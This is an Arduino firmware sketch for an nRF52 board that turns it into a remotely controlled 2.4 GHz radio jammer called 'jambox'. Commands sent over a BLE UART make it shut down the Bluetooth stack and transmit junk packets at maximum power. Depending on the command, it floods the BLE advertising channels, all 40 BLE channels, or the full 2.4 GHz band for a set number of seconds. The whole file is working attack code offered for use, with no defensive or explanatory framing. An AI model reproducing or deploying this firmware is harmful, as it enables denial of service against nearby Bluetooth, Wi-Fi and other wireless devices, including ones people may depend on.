#include <Arduino.h>
#include <bluefruit.h>
#include <Adafruit_TinyUSB.h>
#include "nrf_sdm.h"   // sd_softdevice_disable()

// ── Flow ─────────────────────────────────────────────────────────────────────
// 1. Boot → advertise as "jambox :)-" with Nordic UART Service
// 2. Open nRF Connect → connect → send commands
// 3. Send jam command (e.g. "adv 30") → device replies, disconnects BLE,
//    shuts down SoftDevice, jams raw radio for N seconds, then NVIC_SystemReset()
// 4. Device reboots → back to step 1, ready to reconnect

// ── Jam modes ────────────────────────────────────────────────────────────────
enum Mode { ADV_ONLY, BLE_ALL, FULL_BAND };

// NRF_RADIO FREQUENCY register: RF = 2400 + FREQUENCY (MHz)
// BLE advertising channels: ch37=FREQ2, ch38=FREQ26, ch39=FREQ80
static const uint8_t ADV_FREQ[3] = {2, 26, 80};
static uint8_t       BLE_FREQ[40];

#define PKT_LEN   37
#define TX_POWER  0x08   // +8 dBm max

static uint8_t pkt[PKT_LEN];

// ── BLE services ─────────────────────────────────────────────────────────────
BLEDis  bledis;
BLEUart bleuart;

// ── State ────────────────────────────────────────────────────────────────────
static Mode     jam_mode     = ADV_ONLY;
static uint32_t jam_secs     = 60;
static uint8_t  dwell        = 3;
static uint16_t ctrl_handle  = BLE_CONN_HANDLE_INVALID;

// ── Forward declarations ──────────────────────────────────────────────────────
void connect_callback(uint16_t conn_hdl);
void disconnect_callback(uint16_t conn_hdl, uint8_t reason);
void uart_rx_callback(uint16_t conn_hdl);
void start_jam();

// ── Raw radio (used after SoftDevice is disabled) ─────────────────────────────
static void radio_init() {
  NRF_CLOCK->EVENTS_HFCLKSTARTED = 0;
  NRF_CLOCK->TASKS_HFCLKSTART    = 1;
  while (!NRF_CLOCK->EVENTS_HFCLKSTARTED);

  NRF_RADIO->POWER   = 1;
  NRF_RADIO->TXPOWER = TX_POWER;
  NRF_RADIO->MODE    = (RADIO_MODE_MODE_Ble_1Mbit << RADIO_MODE_MODE_Pos);

  NRF_RADIO->PCNF0 = 0;
  NRF_RADIO->PCNF1 = (RADIO_PCNF1_WHITEEN_Enabled << RADIO_PCNF1_WHITEEN_Pos) |
                     (RADIO_PCNF1_ENDIAN_Little    << RADIO_PCNF1_ENDIAN_Pos)  |
                     (3UL     << RADIO_PCNF1_BALEN_Pos)    |
                     (PKT_LEN << RADIO_PCNF1_STATLEN_Pos)  |
                     (0UL     << RADIO_PCNF1_MAXLEN_Pos);

  NRF_RADIO->BASE0     = 0x89BED600UL;  // BLE advertising access address
  NRF_RADIO->PREFIX0   = 0x0000008EUL;
  NRF_RADIO->TXADDRESS = 0UL;

  NRF_RADIO->CRCCNF  = (RADIO_CRCCNF_LEN_Three    << RADIO_CRCCNF_LEN_Pos)     |
                       (RADIO_CRCCNF_SKIPADDR_Skip << RADIO_CRCCNF_SKIPADDR_Pos);
  NRF_RADIO->CRCINIT = 0x555555UL;
  NRF_RADIO->CRCPOLY = 0x00065BUL;
  NRF_RADIO->PACKETPTR = (uint32_t)pkt;
}

static inline void tx(uint8_t freq) {
  NRF_RADIO->FREQUENCY   = freq;
  NRF_RADIO->DATAWHITEIV = freq;

  NRF_RADIO->EVENTS_READY = 0;
  NRF_RADIO->TASKS_TXEN   = 1;
  while (!NRF_RADIO->EVENTS_READY);

  NRF_RADIO->EVENTS_END  = 0;
  NRF_RADIO->TASKS_START = 1;
  while (!NRF_RADIO->EVENTS_END);

  NRF_RADIO->EVENTS_DISABLED = 0;
  NRF_RADIO->TASKS_DISABLE   = 1;
  while (!NRF_RADIO->EVENTS_DISABLED);
}

// Hardware timer for duration tracking (millis() dies with SoftDevice off)
static void timer_start() {
  NRF_TIMER2->MODE      = TIMER_MODE_MODE_Timer;
  NRF_TIMER2->BITMODE   = TIMER_BITMODE_BITMODE_32Bit;
  NRF_TIMER2->PRESCALER = 4;          // 16 MHz / 2^4 = 1 MHz → 1 tick = 1 µs
  NRF_TIMER2->TASKS_CLEAR = 1;
  NRF_TIMER2->TASKS_START = 1;
}

static uint32_t timer_ms() {
  NRF_TIMER2->TASKS_CAPTURE[0] = 1;
  return NRF_TIMER2->CC[0] / 1000;
}

// ── Jam execution (runs after BLE stack is down) ──────────────────────────────
static void run_jam(Mode m, uint32_t duration_ms) {
  radio_init();
  timer_start();

  while (timer_ms() < duration_ms) {
    switch (m) {
      case ADV_ONLY:
        for (uint8_t i = 0; i < 3; i++)
          for (uint8_t n = 0; n < dwell; n++)
            tx(ADV_FREQ[i]);
        break;

      case BLE_ALL:
        for (uint8_t k = 0; k < 40; k++)
          for (uint8_t n = 0; n < dwell; n++)
            tx(BLE_FREQ[k]);
        break;

      case FULL_BAND:
        for (uint8_t f = 0; f <= 80; f++)
          for (uint8_t n = 0; n < dwell; n++)
            tx(f);
        break;
    }
  }
}

// ── Called from UART callback to kick off a jam session ──────────────────────
void start_jam() {
  const char* mname = jam_mode == ADV_ONLY  ? "ADV (ch37/38/39)" :
                      jam_mode == BLE_ALL   ? "BLE all 40ch"    :
                                              "Full 2.4 GHz";
  char msg[80];
  snprintf(msg, sizeof(msg), "[*] Jamming %s for %lu sec\n", mname, jam_secs);
  bleuart.write(ctrl_handle, (uint8_t*)msg, strlen(msg));
  bleuart.write(ctrl_handle, (uint8_t*)"[*] Reconnect when done.\n", 25);
  delay(400);  // let UART flush before BLE dies

  // Cleanly drop all connections
  Bluefruit.disconnect(ctrl_handle);
  delay(200);

  // Hand radio to us
  sd_softdevice_disable();

  run_jam(jam_mode, jam_secs * 1000UL);

  // Reboot → back to BLE advertising, ready to reconnect
  NVIC_SystemReset();
}

// ── UART command handler ──────────────────────────────────────────────────────
void uart_rx_callback(uint16_t conn_hdl) {
  ctrl_handle = conn_hdl;

  char buf[48] = {0};
  int  len = bleuart.read((uint8_t*)buf, sizeof(buf) - 1);
  for (int i = 0; i < len; i++) {
    if (buf[i] == '\r' || buf[i] == '\n') { buf[i] = 0; break; }
  }
  if (strlen(buf) == 0) return;

  // Parse: <mode> [seconds]
  char*    tok  = strtok(buf, " ");
  uint32_t secs = 0;
  char*    arg  = strtok(NULL, " ");
  if (arg) secs = (uint32_t)atoi(arg);

  if (strcmp(tok, "adv") == 0) {
    jam_mode = ADV_ONLY;
    jam_secs = secs > 0 ? secs : jam_secs;
    start_jam();

  } else if (strcmp(tok, "ble") == 0) {
    jam_mode = BLE_ALL;
    jam_secs = secs > 0 ? secs : jam_secs;
    start_jam();

  } else if (strcmp(tok, "full") == 0) {
    jam_mode = FULL_BAND;
    jam_secs = secs > 0 ? secs : jam_secs;
    start_jam();

  } else if (strcmp(tok, "dwell") == 0 && arg) {
    dwell = constrain(atoi(arg), 1, 50);
    char r[32];
    snprintf(r, sizeof(r), "[*] Dwell set to %d\n", dwell);
    bleuart.write(conn_hdl, (uint8_t*)r, strlen(r));

  } else if (strcmp(tok, "s") == 0 || strcmp(tok, "status") == 0) {
    const char* mname = jam_mode == ADV_ONLY ? "adv" :
                        jam_mode == BLE_ALL  ? "ble" : "full";
    char r[80];
    snprintf(r, sizeof(r), "mode=%s  secs=%lu  dwell=%d\n", mname, jam_secs, dwell);
    bleuart.write(conn_hdl, (uint8_t*)r, strlen(r));

  } else {
    const char* help =
      "Commands:\n"
      "  adv [sec]   jam BLE adv channels (ch37/38/39)\n"
      "  ble [sec]   jam all 40 BLE channels\n"
      "  full [sec]  jam full 2.4 GHz band\n"
      "  dwell <n>   packets per channel (1-50)\n"
      "  status      show current settings\n";
    bleuart.write(conn_hdl, (uint8_t*)help, strlen(help));
  }
}

// ── BLE callbacks ─────────────────────────────────────────────────────────────
void connect_callback(uint16_t conn_hdl) {
  ctrl_handle = conn_hdl;
  const char* banner =
    "\njambox :)- ready\n"
    "Commands: adv [sec]  ble [sec]  full [sec]  dwell <n>  status\n"
    "Example:  adv 30\n\n";
  delay(300);  // give nRF Connect time to subscribe to notifications
  bleuart.write(conn_hdl, (uint8_t*)banner, strlen(banner));
}

void disconnect_callback(uint16_t conn_hdl, uint8_t reason) {
  ctrl_handle = BLE_CONN_HANDLE_INVALID;
}

// ── Setup ─────────────────────────────────────────────────────────────────────
void setup() {
  Serial.begin(115200);

  memset(pkt, 0xFF, sizeof(pkt));
  for (uint8_t k = 0; k < 40; k++) BLE_FREQ[k] = 2 + 2 * k;

  Bluefruit.begin(1, 0);
  Bluefruit.setTxPower(4);
  Bluefruit.setName("jambox :)-");
  Bluefruit.Periph.setConnectCallback(connect_callback);
  Bluefruit.Periph.setDisconnectCallback(disconnect_callback);

  bledis.setManufacturer("Spam Jam Inc.");
  bledis.setModel("SJ-Jambox");
  bledis.begin();

  bleuart.begin();
  bleuart.setRxCallback(uart_rx_callback);

  Bluefruit.Advertising.addFlags(BLE_GAP_ADV_FLAGS_LE_ONLY_GENERAL_DISC_MODE);
  Bluefruit.Advertising.addTxPower();
  Bluefruit.Advertising.addService(bleuart);
  Bluefruit.Advertising.addName();
  Bluefruit.Advertising.start();

  Serial.println("jambox :)- advertising, waiting for nRF Connect...");
}

void loop() {
  // All work done in callbacks
}
